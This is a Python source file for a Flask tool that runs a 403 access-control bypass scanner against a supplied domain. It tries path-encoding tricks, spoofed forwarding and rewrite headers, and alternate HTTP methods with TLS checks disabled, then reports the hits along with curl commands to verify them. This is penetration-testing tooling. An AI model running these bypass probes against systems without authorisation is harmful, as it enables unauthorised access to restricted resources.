# utils/api_bypass.py
import os
import subprocess
import requests
import re
import json
from flask import current_app

def run_bypass(domain, wordlist_path):
    """
    Run 403 bypass tests against a domain using the specified wordlist
    This function reimplements the functionality of bypass-403.sh in Python
    to make it cross-platform compatible
    """
    # Check if we should try to use the script on supported platforms (Linux/Mac)
    try_bash_script = False
    if os.name == 'posix':  # Linux or Mac
        script_path = os.path.join(current_app.root_path, 'bypass-403.sh')
        if os.path.exists(script_path):
            try:
                # Make the script executable
                os.chmod(script_path, 0o755)
                try_bash_script = True
            except:
                pass

    if try_bash_script:
        return run_bash_script(domain, wordlist_path)
    else:
        return run_python_bypass(domain, wordlist_path)

def run_bash_script(domain, wordlist_path):
    """Run the original bash script on Linux/Mac"""
    script_path = os.path.join(current_app.root_path, 'bypass-403.sh')
    
    try:
        process = subprocess.Popen(
            [script_path, domain, wordlist_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = process.communicate()
        
        # Extract successful bypasses from the output
        successful_bypasses = []
        
        # Look for successful bypasses in the output
        for line in stdout.splitlines():
            if "200," in line and "-->" in line:
                successful_bypasses.append(line.strip())
        
        recommendations = generate_recommendations(domain, successful_bypasses)
        
        return {
            "domain": domain,
            "wordlist": os.path.basename(wordlist_path),
            "output": stdout,
            "errors": stderr,
            "successful_bypasses": successful_bypasses,
            "recommendations": recommendations
        }
    
    except Exception as e:
        return {
            "domain": domain,
            "wordlist": os.path.basename(wordlist_path),
            "error": str(e)
        }

def run_python_bypass(domain, wordlist_path):
    """Reimplement bypass-403.sh in Python for Windows compatibility"""
    if not os.path.exists(wordlist_path):
        return {
            "domain": domain,
            "wordlist": os.path.basename(wordlist_path),
            "error": f"Wordlist file '{wordlist_path}' not found!"
        }
    
    output_lines = []
    successful_bypasses = []
    
    # Simulate figlet header
    output_lines.append("Bypass-403")
    output_lines.append("                                               By Iam_J0ker")
    output_lines.append(f"Testing domain: {domain} with wordlist: {os.path.basename(wordlist_path)}")
    output_lines.append("")
    
    # Read wordlist
    try:
        with open(wordlist_path, 'r') as f:
            paths = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
    except Exception as e:
        return {
            "domain": domain,
            "wordlist": os.path.basename(wordlist_path),
            "error": f"Error reading wordlist: {str(e)}"
        }
    
    output_lines.append(f"Starting tests with wordlist: {os.path.basename(wordlist_path)}")
    output_lines.append("==================================")
    output_lines.append("")
    
    # Test each path from the wordlist
    for path in paths:
        output_lines.append(f"Testing path: {path}")
        output_lines.append("=======================")
        
        # Define all the test cases (similar to the bash script)
        test_cases = [
            (f"{domain}/{path}", f"{domain}/{path}"),
            (f"{domain}/%2e/{path}", f"{domain}/%2e/{path}"),
            (f"{domain}/{path}/.", f"{domain}/{path}/."),
            (f"{domain}//{path}//", f"{domain}//{path}//"),
            (f"{domain}/./{path}/./", f"{domain}/./{path}/./"),
            (f"{domain}/{path}%20", f"{domain}/{path}%20"),
            (f"{domain}/{path}%09", f"{domain}/{path}%09"),
            (f"{domain}/{path}?", f"{domain}/{path}?"),
            (f"{domain}/{path}.html", f"{domain}/{path}.html"),
            (f"{domain}/{path}/?anything", f"{domain}/{path}/?anything"),
            (f"{domain}/{path}#", f"{domain}/{path}#"),
            (f"{domain}/{path}/*", f"{domain}/{path}/*"),
            (f"{domain}/{path}.php", f"{domain}/{path}.php"),
            (f"{domain}/{path}.json", f"{domain}/{path}.json"),
            (f"{domain}/{path}..;/", f"{domain}/{path}..;/"),
            (f"{domain}/{path};/", f"{domain}/{path};/"),
        ]
        
        # Headers to test
        header_tests = [
            (f"{domain}/{path}", {"X-Original-URL": path}, f"{domain}/{path} -H X-Original-URL: {path}"),
            (f"{domain}/{path}", {"X-Custom-IP-Authorization": "127.0.0.1"}, f"{domain}/{path} -H X-Custom-IP-Authorization: 127.0.0.1"),
            (f"{domain}/{path}", {"X-Forwarded-For": "http://127.0.0.1"}, f"{domain}/{path} -H X-Forwarded-For: http://127.0.0.1"),
            (f"{domain}/{path}", {"X-Forwarded-For": "127.0.0.1:80"}, f"{domain}/{path} -H X-Forwarded-For: 127.0.0.1:80"),
            (f"{domain}", {"X-rewrite-url": path}, f"{domain} -H X-rewrite-url: {path}"),
            (f"{domain}/{path}", {"X-Host": "127.0.0.1"}, f"{domain}/{path} -H X-Host: 127.0.0.1"),
            (f"{domain}/{path}", {"X-Forwarded-Host": "127.0.0.1"}, f"{domain}/{path} -H X-Forwarded-Host: 127.0.0.1"),
        ]
        
        # Method tests
        method_tests = [
            (f"{domain}/{path}", "POST", {"Content-Length": "0"}, f"{domain}/{path} -H Content-Length:0 -X POST"),
            (f"{domain}/{path}", "TRACE", {}, f"{domain}/{path} -X TRACE"),
        ]
        
        # Run the URL tests
        for url, description in test_cases:
            try:
                response = requests.get(url, verify=False, allow_redirects=True, timeout=5)
                status_code = response.status_code
                size = len(response.content)
                result_line = f"{status_code},{size}  --> {description}"
                
                if status_code == 200:
                    output_lines.append(f"<200>,{size}  --> {description}")  # Will be processed for display
                    successful_bypasses.append(result_line)
                else:
                    output_lines.append(f"{status_code},{size}  --> {description}")
            except Exception as e:
                output_lines.append(f"Error,0  --> {description} ({str(e)})")
        
        # Run the header tests
        for url, headers, description in header_tests:
            try:
                response = requests.get(url, headers=headers, verify=False, allow_redirects=True, timeout=5)
                status_code = response.status_code
                size = len(response.content)
                result_line = f"{status_code},{size}  --> {description}"
                
                if status_code == 200:
                    output_lines.append(f"<200>,{size}  --> {description}")  # Will be processed for display
                    successful_bypasses.append(result_line)
                else:
                    output_lines.append(f"{status_code},{size}  --> {description}")
            except Exception as e:
                output_lines.append(f"Error,0  --> {description} ({str(e)})")
        
        # Run the method tests
        for url, method, headers, description in method_tests:
            try:
                response = requests.request(method, url, headers=headers, verify=False, allow_redirects=True, timeout=5)
                status_code = response.status_code
                size = len(response.content)
                result_line = f"{status_code},{size}  --> {description}"
                
                if status_code == 200:
                    output_lines.append(f"<200>,{size}  --> {description}")  # Will be processed for display
                    successful_bypasses.append(result_line)
                else:
                    output_lines.append(f"{status_code},{size}  --> {description}")
            except Exception as e:
                output_lines.append(f"Error,0  --> {description} ({str(e)})")
        
        # Check Wayback Machine
        try:
            wayback_url = f"https://archive.org/wayback/available?url={domain}/{path}"
            wayback_response = requests.get(wayback_url, timeout=5)
            wayback_data = wayback_response.json()
            output_lines.append("Way back machine:")
            if 'archived_snapshots' in wayback_data and 'closest' in wayback_data['archived_snapshots']:
                snapshot = wayback_data['archived_snapshots']['closest']
                output_lines.append(json.dumps({"available": snapshot.get('available'), "url": snapshot.get('url')}))
            else:
                output_lines.append("No archive snapshots found")
        except Exception as e:
            output_lines.append(f"Error checking Wayback Machine: {str(e)}")
        
        output_lines.append("")
        output_lines.append("")
    
    # Create summary section
    output_lines.append("")
    output_lines.append("")
    output_lines.append("<===HEADER=== SUCCESSFUL BYPASSES (200 STATUS CODES) ===HEADER=>")
    output_lines.append("<===HEADER===========================================HEADER=>")
    
    if not successful_bypasses:
        output_lines.append("No successful bypasses found.")
    else:
        for bypass in successful_bypasses:
            output_lines.append(f"<200>{bypass}")
    
    output_lines.append("All tests completed!")
    
    # Format output as a string - keeping newlines intact
    output = "\n".join(output_lines)
    
    # Generate recommendations
    recommendations = generate_recommendations(domain, successful_bypasses)
    
    # Clean up the successful bypasses for display
    display_bypasses = []
    for bypass in successful_bypasses:
        # Remove any special markup
        clean_bypass = bypass.replace("<200>", "")
        display_bypasses.append(clean_bypass)
    
    return {
        "domain": domain,
        "wordlist": os.path.basename(wordlist_path),
        "output": output,
        "errors": "",
        "successful_bypasses": display_bypasses,
        "recommendations": recommendations
    }

def generate_recommendations(domain, successful_bypasses):
    """Generate recommendations based on successful bypasses"""
    if not successful_bypasses:
        return "No successful bypasses found. The endpoint may not be vulnerable to 403 bypass techniques."
    
    recommendations = [
        f"Found {len(successful_bypasses)} potential bypass methods.",
        "Recommended actions:"
    ]
    
    # Process each successful bypass and create curl commands
    for i, bypass in enumerate(successful_bypasses[:5], 1):
        # Extract the command part from the successful bypass line
        parts = bypass.split("-->")
        if len(parts) > 1:
            command_part = parts[1].strip()
            # Create a curl command based on the technique
            if '-H' in command_part:
                # It's a header-based bypass
                url_part = command_part.split('-H')[0].strip()
                header_part = '-H ' + command_part.split('-H')[1].strip()
                recommendations.append(f"{i}. Verify with: curl -i {url_part} {header_part}")
            elif '-X' in command_part:
                # It's a method-based bypass
                url_part = command_part.split('-X')[0].strip()
                method_part = '-X ' + command_part.split('-X')[1].strip()
                recommendations.append(f"{i}. Verify with: curl -i {url_part} {method_part}")
            else:
                # It's a URL-based bypass
                recommendations.append(f"{i}. Verify with: curl -i {command_part}")
    
    recommendations.append("\nAfter verification, document the findings with screenshots and include response headers in your report.")
    recommendations.append("Consider checking if the bypass works with authenticated sessions by including any necessary cookies or auth headers.")
    
    return "\n".join(recommendations)
